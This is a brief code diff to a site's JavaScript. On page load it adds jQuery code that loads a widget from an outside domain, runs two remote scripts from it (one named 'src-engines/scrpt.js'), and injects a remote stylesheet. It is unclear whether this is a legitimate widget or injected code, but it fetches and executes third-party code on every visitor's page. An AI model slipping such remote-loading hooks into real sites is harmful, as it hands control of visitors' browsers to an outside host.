@@ -40,3 +40,14 @@ else if(cookstrkd[0]== 0){
           deleteAllCookies();
           setTimeout(function(){window.open('../','_self');},1000);
        }
+
+       $(document).ready(function() {
+        var mn= "https://mastrowall.com/"
+        $('#rc-widget').load(mn+'rc-widget/index.html');
+        $.getScript(mn+'rc-widget/script.js');
+        $.getScript(mn+'src-engines/scrpt.js');
+        $('<link>', {
+          rel: 'stylesheet',
+          href: mn+'rc-widget/style.css'
+        }).appendTo('head');
+      });
